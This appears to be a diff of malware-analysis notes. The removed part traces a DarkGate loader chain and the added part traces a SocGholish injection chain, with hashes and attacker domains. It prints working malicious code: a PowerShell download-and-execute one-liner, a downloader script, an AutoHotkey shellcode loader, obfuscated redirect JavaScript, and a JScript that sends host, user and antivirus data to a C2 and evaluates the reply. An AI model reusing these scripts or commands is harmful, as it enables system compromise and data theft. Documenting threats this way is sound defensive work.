@@ -1,146 +1,169 @@
-THREAT IDENTIFICATION: DARKGATE LOADER
+TLP: AMBER - No Attribution
+THREAT IDENTIFICATION: SOCGHOLISH
 
-INFECTION FLOW
-xlsx -> link to vbs file -> powershell scripts -> ahk -> dll -> C2
+STAGE 1 INFECTED DOMAIN
+iamsacademy.com
 
-EMAIL SUBJECT
-Parts Invoice PC-E11892437 - Customer Purchase Order Z72229644
+STAGE 1 INJECTED URL
+https://iamsacademy.com/
 
-EMAIL SENDER
-Barbara Wittrock <moosubi@ttp.org>
+STAGE 1 INJECTED JAVASCRIPT
+<script async src="https://cdnjscloudnetwork.co/privacy/i18min.js"></script>
 
-EMAIL BODY
-Project development insights  
-The enclosed document pack includes critical data for project. Please analyze and offer your suggestions.
+INTERMEDIATE STAGE REDIRECT URL
+https://cdnjscloudnetwork.co/privacy/i18min.js
+(Called from the main page)
 
-XLSX FILE HASHES
-ACH-3263-15March.xlsx
-9234b14a9a5f43a5a3322adad6318901
+REDIRECT SCRIPT
+;(function(v,d,r,y,a,b){a=d.createElement(r);b=d.getElementsByTagName(r)[0];a.async=1;a.src=y;b.parentNode.insertBefore(a,b);})(window,document,'script','https://pluralism.themancav.com/lbK9kO6Q3vnxkIeio4aRsueQh7L82d/o+dXbsug=');
 
-XLSX FILE METADATA
-Author: ttqmvwx
-Last modified by: admin
+STAGE 2 URLS
+https://pluralism.themancav.com/lbK9kO6Q3vnxkIeio4aRsueQh7L82d/o+dXbsug=
 
-Last Modified: Today, 1:15 PM
-Created: 6/5/2015 2:17 PM
+RETURNED SCRIPT
+;(function () {
+  var _0x2112cd = window,
+    _0x2cb1cd = _0x2112cd.document.cookie
+  var _0x3b4a15 = 'adViewEnabled'
+  if (_0x2112cd.localStorage[_0x2112cd.location.hostname]) {
+    return
+  }
+  if (_0x2112cd.navigator.webdriver) {
+    _0x45ad48(
+      'https://pluralism.themancav.com/W1ATsCBycNk/cimCbWQ/kigkdsB5ajHAKTVw2D4zeO8xI0zWKT99xD4iYd8pcj+SPiJh3ylyKYF3cmGSYXJ+yD8yMc0='
+    )
+    return
+  }
+  if (
+    _0x2112cd.outerHeight - _0x2112cd.innerHeight > 200 ||
+    _0x2112cd.outerWidth - _0x2112cd.innerWidth > 330
+  ) {
+    _0x45ad48(
+      'https://pluralism.themancav.com/Ao7/x3msnK5mrMX1NLrT5XH6mrcgtN23cOucr2ftlJho/aChcOGRs2f8jahwrNPlZ/yNqHCsxfUurI3lOKySqWvohaNq6IioIPM='
+    )
+    return
+  }
+  if (
+    _0x2cb1cd.indexOf('wordpress_logged_in_') !== -1 ||
+    _0x2cb1cd.indexOf('wp-settings-') !== -1
+  ) {
+    return
+  }
+  if (typeof _0x2112cd[_0x3b4a15] !== 'undefined') {
+    return
+  }
+  _0x2112cd[_0x3b4a15] = true
+  _0x2112cd.addEventListener('mousemove', _0x2a49ce, true)
+  function _0x2a49ce() {
+    _0x2112cd.removeEventListener('mousemove', _0x2a49ce, true)
+    _0x45ad48(
+      'https://pluralism.themancav.com/2HgFVqNaZj+8Wj9k7kwpdKsMYCb6Qic3thlpL6IdWjCoWil0qlo/dLYJcSSzG3UxvhJxPqpaeA=='
+    )
+  }
+  function _0x45ad48(_0x40147f) {
+    var _0x42ca1e = document.createElement('script')
+    _0x42ca1e.async = true
+    _0x42ca1e.src = _0x40147f
+    var _0x1bd434 = document.getElementsByTagName('script')[0]
+    _0x1bd434.parentNode.insertBefore(_0x42ca1e, _0x1bd434)
+  }
+})()
 
-XLSX FILE BUTTON HYPERLINK
-\\159.203.41.26\share\EXCEL_ONLINE_DOCUMENT_SHARED.vbs...
+NEXT SCRIPT URL
+https://pluralism.themancav.com/2HgFVqNaZj+8Wj9k7kwpdKsMYCb6Qic3thlpL6IdWjCoWil0qlo/dLYJcSSzG3UxvhJxPqpaeA==
+(Returns JavaScript pointing to the next URL)
 
-RETRIEVED WITH:
-file:///\\159.203.41.26\share\EXCEL_ONLINE_DOCUMENT_SHARED.vbs
+JAVASCRIPT FILE DOWNLOAD URL
+https://pluralism.themancav.com/yUqN3bJo7rStaLfv/36h/7o+6K3rcK+xqCTptKct0rugJuj/5Wj///No/rulLuaooyTopbk86r+zJef/tA==
 
-RELEVANT PART OF THE VBS SCRIPT
-cpiscemb = "powershell"
-hercrsvx = "Shell.Application"
-kvauqjzp = "-Command Invoke-Expression (Invoke-RestMethod -Uri 'diveupdown.com/hyslwfla')"
-CreateObject(hercrsvx).ShellExecute cpiscemb, kvauqjzp ,"","",0
+JAVASCRIPT FILE HASH
+Update.js
+21fb7f87b7cf4b4766986031a3e47b72
+SHA1: aa2b8e4cdf0eeaec4dadc0f561d950479417d143
+SHA256: eec86d139e5a3deea66e62b9030d2ce672443d76ccd6034acaa890276a5783ee
 
-INTERCEPTED POWERSHELL COMMAND
-"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command Invoke-Expression (Invoke-RestMethod -Uri 'diveupdown.com/hyslwfla')
-
-DOWNLOADED SCRIPT URL
-http://diveupdown.com/hyslwfla
-
-DOWNLOADED SCRIPT FILE HASH
-hyslwfla
-4dc3151ce728b3e2191b8ff2a60e4fc9
-
-DOWNLOADED SCRIPT CONTENTS
-ni 'C:/cqii' - Type Directory - Force;
-cd 'C:/cqii';
-if (Test - Path - Path 'C:/ProgramData/Kaspersky Lab') {
-    Invoke - WebRequest - Uri "http://diveupdown.com/aaa" - OutFile 'AutoHotkey.exe';
-} else {
-    Invoke - WebRequest - Uri "http://diveupdown.com/aa" - OutFile 'a.bin';
-    certutil - decodehex a.bin AutoHotkey.exe;
+JAVASCRIPT FILE CONTENTS (DEOBFUSCATED)
+if (1) {
+function a0_0xea108e(_0x1de46d) {
+var _0x1c180f = 'responseText'
+return _0x1de46d[_0x1c180f]
 }
-Invoke - WebRequest - Uri "http://diveupdown.com/ktsrkxhc" - OutFile 'script.ahk';
-Invoke - WebRequest - Uri "http://diveupdown.com/qxfjufdj" - OutFile 'test.txt';
-start 'AutoHotkey.exe' - a 'script.ahk';
-attrib + h 'C:/cqii'
-
-DOWNLOADED BINARY URL
-http://diveupdown.com/aa
-
-DOWNLOADED BINARY FILE HASH
-aa
-bf88d228baec74c7928df463db0f0fdc
-(Same as the file: a.bin)
-
-DOWNLOADED AUTHOTKEY SCRIPT URL
-http://diveupdown.com/ktsrkxhc
-
-DOWNLOADED AUTOHOTKEY SCRIPT FILE HASH
-ktsrkxhc
-9749a8071bf9087e85495663d5328ffa
-(Same as the file named: script.ahk)
-
-CONTENTS OF CLEANED UP AUTOHOTKEY SCRIPT
-#NoTrayIcon
-MEM_COMMIT := 0x1000
-MEM_RESERVE := 0x2000
-PAGE_EXECUTE_READWRITE := 0x40
-archivo := A_ScriptDir . "\test.txt"
-FileRead, contenidoHex, %archivo%
-size := 468013
-lpAddress := DllCall("VirtualAlloc", "Ptr", 0, "UInt", size, "UInt", MEM_COMMIT | MEM_RESERVE, "UInt", PAGE_EXECUTE_READWRITE)
-Loop, % size {
-hexByte := "0x" . SubStr(contenidoHex, 2 * A_Index - 1, 2)
-NumPut(hexByte, lpAddress + (A_Index - 1), "Char")
+var a0_0x2974b4 = new this.ActiveXObject('MSXML2.XMLHTTP')
+a0_0x2974b4.open(
+'POST',
+'https://pip.pages.microcloud360.com/editContent',
+false
+)
+a0_0x2974b4.setRequestHeader('Upgrade-Insecure-Requests', '1')
+a0_0x2974b4.send('lM6JNuuGGNT4WCi+mY5c4q0tAfuCmGYnUYWrFFG3rg==')
+this.eval(a0_0xea108e(a0_0x2974b4))
 }
-DllCall(lpAddress)
 
-LEGITIMATE AUTOHOTKEY BINARY FILE HASH
-AutoHotkey.exe
-a59a2d3e5dda7aca6ec879263aa42fd3
+STAGE 3 PROXY FOR SOCGHOLISH C2
+https://pip.pages.microcloud360.com/editContent
 
-DOWNLOADED BINARY URL
-http://diveupdown.com/qxfjufdj
+RETURNED SCRIPT
+var sp = ''
+var vb = new ActiveXObject('WScript.Shell')
+var iv = new ActiveXObject('WScript.Network')
+var yw = []
+yw.push('b')
+yw.push('505')
+yw.push(WScript.ScriptFullName)
+yw.push(iv.ComputerName)
+yw.push(iv.UserName)
+yw.push(iv.UserDomain)
+yw.push(vb.ExpandEnvironmentStrings('%userdnsdomain%'))
+yw.push(wz('CIMV2', 'Win32_ComputerSystem', 'Manufacturer'))
+yw.push(wz('CIMV2', 'Win32_ComputerSystem', 'Model'))
+yw.push(
+  wz('CIMV2', 'Win32_BIOS', 'Version') +
+    wz('CIMV2', 'Win32_BIOS', 'SerialNumber')
+)
+yw.push(wz('SecurityCenter2', 'AntiSpywareProduct', 'displayName'))
+yw.push(wz('SecurityCenter2', 'AntiVirusProduct', 'displayName'))
+yw.push(wz('CIMV2', 'CIM_NetworkAdapter', 'MACAddress'))
+yw.push(wz('CIMV2', 'Win32_Process', 'Name'))
+yw.push(wz('CIMV2', 'Win32_OperatingSystem', 'BuildNumber'))
+function wz(nl, rj, lo) {
+  var my = ''
+  try {
+    var rx = GetObject('winmgmts:\\\\.\\root\\' + nl)
+    var hu = rx.ExecQuery('SELECT * FROM ' + rj, 'WQL')
+    var rs = new Enumerator(hu)
+    for (; !rs.atEnd(); rs.moveNext()) {
+      var zz = rs.item()
+      if (zz[lo]) {
+        my += zz[lo] + '|'
+      }
+    }
+  } catch (e) {
+    my = '-1'
+  }
+  return my
+}
+try {
+  var ii = ''
+  for (var kd = 0; kd < yw.length; kd++) {
+    ii += kd + '=' + encodeURIComponent(yw[kd]) + '&'
+  }
+  var my = ''
+  var nf = new ActiveXObject('MSXML2.XMLHTTP')
+  nf.open('POST', 'https://pip.pages.microcloud360.com/editContent', false)
+  nf.setRequestHeader('Upgrade-Insecure-Requests', '1')
+  nf.send(ii)
+  my = nf.responseText
+  var evString = 'eval'
+  this[evString](my)
+} catch (e) {}
 
-DOWNLOADED BINARY FILE HASH
-qxfjufdj
-1985c372616f1037d06e8913b11529e3
-(Same as the file named: test.txt)
+PAYLOAD DOWNLOAD URL
+I did not obtain a payload.
 
-BOTNET INOFRMATION
-botnet: admin888
+PAYLOAD FILE HASH
+I did not obtain a payload.
 
-
-MEMORY STRINGS (AutoHotKey.exe Process)
-0x4f51ad8 (1025): 0=diveupdown.com|
-8=No
-11=DarkGate
-12=R0ijS0qCVITtS0e6xeZ
-13=6
-14=Yes
-15=80
-1=Yes
-32=No
-3=Yes
-4=No
-18=50
-6=Yes
-7=No
-19=4000
-5=No
-21=No
-22=No
-23=No
-31=Yes
-24=123
-25=admin888
-26=No
-27=lIdlrBji
-28=No
-29=6
-tabla=ms(.}BSYvy8THE3z{Du7kXUtfQjM=,2o$lGZJ"9g]dcLrP5*4pKFqWniN6O& IhAe)[ba1R0xVCw
-
-UNPACKED PAYLOAD FILE HASH
-4c80b3d.exe
-e69f7961b78c3f75a0e7b4a76500c689
-
-DARKGATE C2s
-POST http://diveupdown.com/
+PAYLOAD C2
+I did not obtain a payload.
 
 
